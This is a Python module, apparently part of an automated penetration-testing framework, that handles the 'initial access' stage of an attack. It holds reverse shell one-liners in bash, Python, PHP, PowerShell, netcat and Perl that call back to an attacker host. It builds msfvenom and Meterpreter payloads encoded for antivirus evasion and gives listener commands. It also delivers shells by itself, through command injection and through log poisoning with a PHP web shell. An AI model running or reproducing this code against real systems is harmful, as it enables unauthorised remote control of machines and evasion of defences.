"""
shell_handler.py - Phase 3: Initial Access / Shell

Covers:
  - msfvenom payload generation (Windows/Linux EXE, PS1, PHP, etc.)
  - Reverse shell delivery via multiple vectors
  - Netcat / msfconsole listener management
  - Shell stabilization (pty upgrade)
  - Fallback shell chain
"""

import asyncio
import os
import re
import signal
import subprocess
import tempfile
from pathlib import Path
from typing import Optional, List

from rich.console import Console
from rich.panel import Panel

from modules.utils import run_command, run_command_shell, save_output, has_tool

console = Console()

# ─── Reverse shell payloads (pre-built strings) ───────────────────────────────

BASH_REVSHELL = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
PYTHON_REVSHELL_LIN = (
    "python3 -c 'import socket,subprocess,os;"
    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
    "s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);"
    "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    "subprocess.call([\"/bin/sh\",\"-i\"])'"
)
PHP_REVSHELL = (
    "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
    "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
)
POWERSHELL_REVSHELL = (
    "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
    "$stream = $client.GetStream();"
    "[byte[]]$bytes = 0..65535|%{{0}};"
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
    "$sendback = (iex $data 2>&1 | Out-String );"
    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
    "$stream.Write($sendbyte,0,$sendbyte.Length);"
    "$stream.Flush()}};"
    "$client.Close()"
)
NC_TRADITIONAL = "nc -e /bin/bash {lhost} {lport}"
NC_NO_E = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
PERL_REVSHELL = (
    "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
    "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
    "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
    "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
)

REVSHELLS = {
    "bash": BASH_REVSHELL,
    "python": PYTHON_REVSHELL_LIN,
    "php": PHP_REVSHELL,
    "powershell": POWERSHELL_REVSHELL,
    "nc_e": NC_TRADITIONAL,
    "nc_pipe": NC_NO_E,
    "perl": PERL_REVSHELL,
}

PTY_UPGRADE = """
# Shell stabilization commands (run inside victim shell):
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm
# OR use:
script /dev/null -c bash
"""


class ShellHandler:
    def __init__(self, target: str, target_dir: Path, cfg, log, all_results: dict):
        self.target = target
        self.target_dir = target_dir
        self.cfg = cfg
        self.log = log
        self.all_results = all_results
        self.dry_run = cfg.is_dry_run()
        self.lhost = cfg.get("lhost", "")
        self.lport = cfg.get("lport", 4444)
        self.os_type = all_results.get("recon", {}).get("os", "Unknown")

        self.results = {
            "success": False,
            "method": None,
            "shell_type": None,
            "payload_files": [],
            "listener_cmd": None,
            "revshell_cmds": {},
            "notes": [],
        }

        (target_dir / "shells").mkdir(parents=True, exist_ok=True)

    async def run(self) -> dict:
        """Generate payloads and show shell delivery options."""
        console.print(f"[red][*] Setting up shell options for {self.target} ({self.os_type})[/red]")

        # Generate all payloads
        await self._generate_revshells()
        await self._generate_msfvenom_payloads()
        await self._setup_listener_instructions()

        # Try automated delivery via discovered vectors
        shell_vectors = self.all_results.get("exploit", {}).get("shell_vectors", [])
        for vector in shell_vectors:
            if not self.results["success"]:
                await self._deliver_via_vector(vector)

        self._print_shell_guide()
        return self.results

    # ── Reverse Shell Commands ────────────────────────────────────────────────

    async def _generate_revshells(self):
        """Format all reverse shell one-liners for the target."""
        shells_file = self.target_dir / "shells" / "revshells.txt"
        lines = [
            f"# Reverse Shells for {self.target}",
            f"# LHOST: {self.lhost}  LPORT: {self.lport}",
            "=" * 60,
            "",
        ]

        for name, tmpl in REVSHELLS.items():
            cmd = tmpl.format(lhost=self.lhost, lport=self.lport)
            self.results["revshell_cmds"][name] = cmd
            lines.append(f"# [{name.upper()}]")
            lines.append(cmd)
            lines.append("")

        # Add PTY upgrade instructions
        lines.append("# Shell Stabilization:")
        lines.append(PTY_UPGRADE)

        save_output(shells_file, "\n".join(lines))
        console.print(f"[green][+] Reverse shell commands saved: {shells_file}[/green]")

    # ── msfvenom Payloads ─────────────────────────────────────────────────────

    async def _generate_msfvenom_payloads(self):
        """Generate binary payloads using msfvenom."""
        if not has_tool("msfvenom"):
            console.print("[yellow][!] msfvenom not found; skipping payload generation[/yellow]")
            return

        payloads = []

        if self.os_type in ("Windows", "Unknown"):
            payloads.extend([
                {
                    "name": "windows_x64_revtcp.exe",
                    "payload": "windows/x64/shell_reverse_tcp",
                    "format": "exe",
                },
                {
                    "name": "windows_x64_meterp.exe",
                    "payload": "windows/x64/meterpreter/reverse_tcp",
                    "format": "exe",
                },
                {
                    "name": "windows_revshell.ps1",
                    "payload": "cmd/windows/reverse_powershell",
                    "format": "psh",
                },
                {
                    "name": "windows_revshell.aspx",
                    "payload": "windows/x64/shell_reverse_tcp",
                    "format": "aspx",
                },
            ])

        if self.os_type in ("Linux", "Unknown"):
            payloads.extend([
                {
                    "name": "linux_x64_revtcp",
                    "payload": "linux/x64/shell_reverse_tcp",
                    "format": "elf",
                },
                {
                    "name": "linux_x64_meterp",
                    "payload": "linux/x64/meterpreter/reverse_tcp",
                    "format": "elf",
                },
                {
                    "name": "revshell.php",
                    "payload": "php/reverse_php",
                    "format": "raw",
                },
                {
                    "name": "revshell.py",
                    "payload": "cmd/unix/reverse_python3",
                    "format": "raw",
                },
            ])

        tasks = [self._build_payload(p) for p in payloads]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _build_payload(self, payload_info: dict):
        """Build a single msfvenom payload."""
        out_file = self.target_dir / "shells" / payload_info["name"]
        cmd = [
            "msfvenom",
            "-p", payload_info["payload"],
            f"LHOST={self.lhost}",
            f"LPORT={self.lport}",
            "-f", payload_info["format"],
            "-o", str(out_file),
        ]

        # Add encoder for AV evasion (basic)
        if payload_info["format"] == "exe":
            cmd.extend(["-e", "x86/shikata_ga_nai", "-i", "5"])

        if self.dry_run:
            console.print(f"[dim][DRY-RUN] Would generate: {payload_info['name']}[/dim]")
            return

        rc, stdout, stderr = await run_command(
            cmd, timeout=60, log=self.log, dry_run=self.dry_run
        )

        if out_file.exists():
            self.results["payload_files"].append(str(out_file))
            console.print(f"[green][+] Payload: {out_file.name} ({out_file.stat().st_size} bytes)[/green]")

    # ── Listener Setup ────────────────────────────────────────────────────────

    async def _setup_listener_instructions(self):
        """Print listener commands for the operator."""
        listener_file = self.target_dir / "shells" / "listeners.txt"
        lines = [
            f"# Listener Setup for {self.target}",
            f"# LHOST: {self.lhost}  LPORT: {self.lport}",
            "",
            "# ── Netcat (simple) ──",
            f"nc -lvnp {self.lport}",
            "",
            "# ── rlwrap nc (better) ──",
            f"rlwrap nc -lvnp {self.lport}",
            "",
            "# ── Metasploit multi/handler ──",
            "msfconsole -q",
            "use exploit/multi/handler",
            "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
            f"set LHOST {self.lhost}",
            f"set LPORT {self.lport}",
            "run -j",
            "",
            "# ── Background handler via MSF resource ──",
            f"msfconsole -q -x 'use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; "
            f"set LHOST {self.lhost}; set LPORT {self.lport}; run -j'",
        ]

        nc_cmd = f"nc -lvnp {self.lport}"
        self.results["listener_cmd"] = nc_cmd
        save_output(listener_file, "\n".join(lines))

        console.print(Panel(
            f"[bold cyan]Start your listener:[/bold cyan]\n\n"
            f"[bold white]  {nc_cmd}[/bold white]\n\n"
            f"[dim]or see: {listener_file}[/dim]",
            title="[bold red]📡 LISTENER[/bold red]",
            border_style="red",
        ))

    # ── Automated Delivery ────────────────────────────────────────────────────

    async def _deliver_via_vector(self, vector: dict):
        """Attempt to deliver a reverse shell via a discovered vector."""
        vtype = vector.get("type")

        if vtype == "cmdi":
            await self._deliver_cmdi(vector)
        elif vtype == "lfi":
            await self._deliver_lfi_to_rce(vector)

    async def _deliver_cmdi(self, vector: dict):
        """Deliver shell via command injection vector."""
        url = vector.get("url", "")
        if not url or self.dry_run:
            return

        # URL-encode the bash revshell
        import urllib.parse
        shell_cmd = BASH_REVSHELL.format(lhost=self.lhost, lport=self.lport)
        encoded = urllib.parse.quote(shell_cmd)

        # Replace the id command with our shell
        delivery_url = re.sub(r";\s*id|%3B%20id|\|%20id|\|id", ";" + encoded, url)

        console.print(f"[yellow][*] Attempting CMDI delivery to {delivery_url[:80]}...[/yellow]")
        console.print(f"[yellow][!] Make sure listener is running: nc -lvnp {self.lport}[/yellow]")

        # Note: we don't actually connect the shell here (needs interactive listener)
        # Instead, log the attempt and mark as needing manual confirmation
        self.results["notes"].append(f"CMDI delivery attempted via {url}")

    async def _deliver_lfi_to_rce(self, vector: dict):
        """Try to escalate LFI to RCE via log poisoning."""
        url = vector.get("url", "")
        console.print(f"[yellow][*] LFI detected - attempting log poisoning RCE...[/yellow]")

        # Poison access log via User-Agent
        if has_tool("curl") and not self.dry_run:
            php_shell = "<?php system($_GET['cmd']); ?>"
            cmd = [
                "curl", "-sk", "-H",
                f"User-Agent: {php_shell}",
                f"http://{self.target}/",
            ]
            await run_command(cmd, timeout=10, log=self.log)

            # Then try to include the log
            log_paths = [
                "/var/log/apache2/access.log",
                "/var/log/nginx/access.log",
                "/proc/self/fd/2",
            ]
            for log_path in log_paths:
                test_url = re.sub(r"=.*", f"={log_path}", url)
                check_url = f"{test_url}&cmd=id"
                cmd2 = ["curl", "-sk", "--connect-timeout", "5", check_url]
                rc, stdout, _ = await run_command(cmd2, timeout=10, log=self.log)

                if "uid=" in stdout:
                    console.print(f"[red][!] LFI→RCE via log poisoning! Log: {log_path}[/red]")
                    self.results["success"] = True
                    self.results["method"] = "lfi_log_poisoning"
                    self.results["notes"].append(f"RCE via LFI log poisoning: {check_url}")
                    break

    # ── Guide ─────────────────────────────────────────────────────────────────

    def _print_shell_guide(self):
        """Print a helpful guide for the operator."""
        shells_dir = self.target_dir / "shells"
        guide = Panel(
            f"""[bold]Generated Artifacts:[/bold]
  📄 {shells_dir}/revshells.txt    - All reverse shell one-liners
  📄 {shells_dir}/listeners.txt    - Listener setup commands
  📦 {shells_dir}/               - msfvenom payloads

[bold]Quick Start:[/bold]
  1. Start listener:   [cyan]nc -lvnp {self.lport}[/cyan]
  2. Copy shell cmd from revshells.txt
  3. Execute on target via any available vector

[bold]Shell Stabilization (after catching shell):[/bold]
  [cyan]python3 -c 'import pty; pty.spawn("/bin/bash")'[/cyan]
  [dim]Ctrl+Z → stty raw -echo → fg → export TERM=xterm[/dim]

[bold]OS Detected:[/bold] {self.os_type}
[bold]Payloads Generated:[/bold] {len(self.results["payload_files"])}
""",
            title="[bold red]🐚 SHELL GUIDE[/bold red]",
            border_style="red",
        )
        console.print(guide)
